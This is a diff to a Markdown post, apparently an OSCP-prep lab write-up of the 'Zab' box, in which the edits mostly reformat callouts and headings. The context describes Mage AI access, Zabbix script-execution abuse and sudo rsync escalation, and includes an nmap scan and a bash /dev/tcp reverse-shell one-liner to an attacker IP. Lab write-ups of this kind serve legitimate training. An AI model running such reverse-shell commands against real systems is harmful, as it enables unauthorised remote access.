@@ -1,7 +1,7 @@
 ---
 layout: /src/layouts/PostLayout.astro
-title: Lavita
-tags: []
+title: Zab
+tags: ["Ligolo"]
 ---
 **Start 10:48 20-05-2025**
 
@@ -13,12 +13,13 @@ Scope:
 
 # Objectives
 
->[!summary]
->This lab challenges you to exploit misconfigurations in Mage AI and Zabbix to escalate privileges to root. Gaining initial access through Mage AI, you'll extract database credentials and leverage port forwarding to access the restricted Zabbix UI. By abusing Zabbix’s script execution feature, you'll execute arbitrary commands, elevate privileges to zabbix, and ultimately escalate to root using rsync misconfigurations.
+:::summary
+This lab challenges you to exploit misconfigurations in Mage AI and Zabbix to escalate privileges to root. Gaining initial access through Mage AI, you'll extract database credentials and leverage port forwarding to access the restricted Zabbix UI. By abusing Zabbix’s script execution feature, you'll execute arbitrary commands, elevate privileges to zabbix, and ultimately escalate to root using rsync misconfigurations.
+:::
 
 This lab simulates an attack scenario where you exploit misconfigurations in Mage AI and Zabbix to escalate privileges to root. After gaining initial access through Mage AI, you'll extract database credentials and use port forwarding to bypass access restrictions to the Zabbix UI. By abusing Zabbix’s script execution feature, you'll execute arbitrary commands, gain a shell as zabbix, and escalate to root using a sudo misconfiguration with rsync.
 
-## Attack Zab
+# Attack Zab
 
 - Gain access to Mage AI terminal as www-data.
 - Extract MySQL database credentials and retrieve the Zabbix admin password.
@@ -26,9 +27,9 @@ This lab simulates an attack scenario where you exploit misconfigurations in Mag
 - Exploit Zabbix script execution to gain a shell as zabbix.
 - Escalate to root by abusing sudo rsync.
 
-# Recon
+## Recon
 
-## Nmap
+### Nmap
 
 ```bash
 sudo nmap -sC -sV zab -sT -vvvv -p- -Pn -T5 --min-rate=5000
@@ -49,15 +50,16 @@ PORT     STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## 6789/TCP - HTTP
+### 6789/TCP - HTTP
 
 I went to this webpage and found the following:
 
 ![](../../../assets/fb5ae45c9cafff6eb8c1f8d2f77c3279.png)
 
->[!note]
->Funnily enough I was able to find `local.txt` in here lol:
->![](../../../assets/57fe1f93c15f1f5ecb1025c80b421c98.png)
+:::note
+Funnily enough I was able to find `local.txt` in here lol:
+![](../../../assets/57fe1f93c15f1f5ecb1025c80b421c98.png)
+:::
 
 This is because there's already a terminal running here:
 
@@ -67,8 +69,8 @@ This is because there's already a terminal running here:
 
 ![](../../../assets/31abe4eb93b09247f273e426312d66f0.png)
 
-# Foothold
-## Shell as www-data
+## Foothold
+### Shell as www-data
 
 I was able to ping myself so I figured I could get easy RCE:
 
@@ -160,8 +162,9 @@ I started enumerating the website and how to access any spot to get RCE from:
 
 ![](../../../assets/d1102cbd24050f95c835e2a5fad69250.png)
 
->[!note]
->I found the above on a forum post
+:::note
+I found the above on a forum post
+:::
 
 ![](../../../assets/da576b730ebbc76ad9d8ea6f4d94dab6.png)
 
@@ -183,8 +186,9 @@ Click on it and it should execute:
 
 ![](../../../assets/bac696e621855bdc050869916085217c.png)
 
->[!fail]
->It kept hanging instead so I `base64` encoded it:
+:::fail
+It kept hanging instead so I `base64` encoded it:
+:::
 
 ![](../../../assets/929bbf537244235457702226c50d563a.png)
 
@@ -204,8 +208,9 @@ echo ‘bash -i >& /dev/tcp/192.168.45.179/443 0>&1’ | base64
 
 ![](../../../assets/dbc85eb6332a5f53a1596edf4ad395ce.png)
 
->[!bug]
->I had to restart the fucking box and it worked from the get go:
+:::bug
+I had to restart the fucking box and it worked from the get go:
+:::
 
 ![](../../../assets/b49704c12c60fb5f08d2fa296f34d0d5.png)
 
@@ -213,8 +218,8 @@ echo ‘bash -i >& /dev/tcp/192.168.45.179/443 0>&1’ | base64
 
 ![](../../../assets/a41592e501aeacd8f08b1c0e3063ab44.png)
 
-# Privilege Escalation
-## Enumeration
+## Privilege Escalation
+### Enumeration
 
 Once we gain access we go right back to enum:
 
@@ -234,13 +239,12 @@ And we're *root* just like that.
 
 ![](../../../assets/d3590383047714420a1a983f3c5b3d0e.png)
 
->[!summary]
->Very easy box, could've saved a lot of time if the connection didn't fuck me up as ALWAYS!!!
+:::summary
+Very easy box, could've saved a lot of time if the connection didn't fuck me up as ALWAYS!!!
+:::
 
 ---
 
 **Finished 13:03 20-05-2025**
 
 [^Links]: [[OSCP Prep]]
-
-#Ligolo 
